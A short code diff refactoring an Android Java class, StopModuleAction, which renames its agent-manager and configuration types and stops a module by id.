@@ -11,12 +11,13 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
-import com.android.service.agent.AgentManager;
+import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.util.Check;
 
 public class StopModuleAction extends ModuleAction {
-	public StopModuleAction(ActionConf params) {
+	public StopModuleAction(ConfAction params) {
 		super(params);
 	}
 
@@ -27,7 +28,7 @@ public class StopModuleAction extends ModuleAction {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
 		}
-		final AgentManager agentManager = AgentManager.self();
+		final ManagerAgent agentManager = ManagerAgent.self();
 
 		agentManager.stop(moduleId);
 		return true;
